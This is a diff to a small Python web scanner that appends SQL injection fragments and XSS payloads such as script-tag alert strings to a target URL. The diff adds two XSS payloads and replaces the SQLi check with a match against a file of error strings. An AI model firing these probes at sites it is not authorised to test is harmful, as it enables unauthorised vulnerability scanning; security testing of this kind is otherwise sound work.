@@ -2,7 +2,9 @@
 import argparse, urllib.request, os, sys
 
 sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
-xss = ["';alert(String.fromCharCode(88,83,83))//",
+xss = ["'<SCRIPT>alert(0)</SCRIPT>#",
+       "'<SCRIPT>alert(0)</SCRIPT>//",
+        "';alert(String.fromCharCode(88,83,83))//",
        "\";alert(String.fromCharCode(88,83,83))//",
        "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "'';!--\"<XSS>=&{()}",
@@ -55,15 +57,14 @@ def get():
     if x=="1":
         for i in sqli:
             req = args.url + i
-            try:
-                with urllib.request.urlopen(req) as response:
-                   html = str(response.read())
-            except Exception as e:
-                print("\nLikely vulnerable")
-                print(type(e))
-                print(e)
-                print(html)
-                break
+
+            with urllib.request.urlopen(req) as response:
+                html = str(response.read())
+            with open("sql_errors.txt", "r") as f:
+                for line in f:
+                    if line in html:
+                        print("\nLikely vulnerble.")
+                        break
 
     elif x=="2":
         for i in xss:
